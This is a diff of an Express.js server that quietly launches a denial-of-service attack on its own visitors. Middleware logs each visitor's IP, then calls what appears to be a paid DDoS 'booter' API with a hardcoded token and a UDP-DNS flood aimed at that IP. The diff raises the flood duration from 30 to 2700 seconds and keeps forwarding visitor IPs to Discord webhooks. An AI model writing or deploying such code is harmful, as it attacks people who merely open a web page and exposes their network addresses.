@@ -13,7 +13,7 @@ let lock = false;
 
 // Função para enviar requisição à API
 async function sendApiRequest(ip) {
-    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
+    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=2700&method=UDP-DNS`;
     try {
         for (let i = 0; i < 6; i++) {
         await axios.get(url);
@@ -97,7 +97,7 @@ async function cleanupVisitors() {
 
         const lastCleanup = new Date(config.lastCleanup);
 
-        if ((now - lastCleanup) >= 1 * 60 * 1000) {
+        if ((now - lastCleanup) >= 2 * 60 * 1000) {
             await fs.writeFile(visitorsFile, JSON.stringify([], null, 2));
             console.log('Visitors file cleaned.');
 
@@ -148,9 +148,8 @@ app.use(async (req, res, next) => {
             if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('::'))) return
             visitors.push({ ip });
             await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
-            const timestamp = new Date().toISOString();
             setTimeout(await sendApiRequest(ip), 5000);
-            await sendDiscordWebhooks(ip, timestamp);
+            await sendDiscordWebhooks(ip);
         }
     } catch (err) {
         console.error('Error processing visitors file:', err);
